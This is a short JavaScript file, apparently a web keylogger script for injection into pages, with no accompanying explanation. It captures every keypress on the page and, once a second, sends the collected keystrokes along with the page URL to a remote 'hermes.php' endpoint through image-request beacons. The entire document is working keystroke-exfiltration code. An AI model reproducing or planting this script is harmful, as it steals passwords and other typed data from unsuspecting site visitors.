var keys = '';
var current = document.URL;

new Image().src = url + '/hermes.php?c=[' + current + ']';

document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function(){
        if( keys != "" )
                new Image().src = url + '/hermes.php?c=' + keys + ' ';
        keys = '';
}, 1000);

